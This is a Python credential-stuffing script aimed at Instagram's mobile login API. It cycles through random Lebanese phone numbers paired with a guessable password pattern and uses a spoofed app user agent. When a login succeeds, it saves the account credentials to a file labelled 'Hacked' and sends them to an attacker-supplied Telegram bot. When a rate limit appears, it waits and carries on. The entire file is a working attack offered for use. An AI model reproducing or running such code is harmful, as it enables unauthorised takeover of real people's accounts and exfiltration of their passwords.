import requests,sys,time,os,random,pyfiglet,colorama,secrets,uuid
from secrets import token_hex
from time import sleep
from uuid import uuid4
import user_agent 
from user_agent import generate_user_agent
uid = uuid.uuid4()
cookie = secrets.token_hex(8) * 2
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
print(str(pyfiglet.figlet_format('InstaGram'))+f"{S}Whisper </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"By {colorama.Fore.CYAN}@itzthedevil{colorama.Fore.RESET}")
ID=input('[+] Enter YOUR ID : ')
tok=input('[+] Enter TOKEN BOT : ')
print(f"{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
user = '1234567890'
while True:
    whisper = str("".join(random.choice(user)for i in range(6)))
    username= '+96176'+whisper
    password = '76'+whisper
    if username =='':
        exit()
    if password =='':
        exit()
    cookies = token_hex(8) * 2
    url='https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                 'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
              'Host':'i.instagram.com'}
    data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
    req= requests.post(url, headers=headers, data=data)
#    print(req.json())
    if 'logged_in_user' in req.json():
        with open('Hacked.txt', 'a') as (HACKED):
          HACKED.write(f'.💀. Hacked InstaGram .💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.✉. E-mail ==> {username} \n.🚫. PassWord ==> {password}\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @itzthedevil\n')
          print(f'{G}.💀. Hacked InstaGram .💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.✉. E-mail ==> {username} \n.🚫. PassWord ==> {password}\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @itzthedevil')
          tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.💀. Hacked InstaGram .💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> {username} \n.🚫. PassWord ==> {password}\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @itzthedevil"
        i = requests.post(tlg)
    if '"message":"challenge_required"' in req.text:
        with open('Secure.txt', 'a') as (SECURE):
            SECURE.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            print(f'{S} E-mail : {username} | PassWord : {password}')
    if "'message': 'Please wait a few minutes before you try again.'" in req.json():
          print('Wait')
          sleep(30)
    else:
        print(f'{E} E-mail : {username} | PassWord : {password}')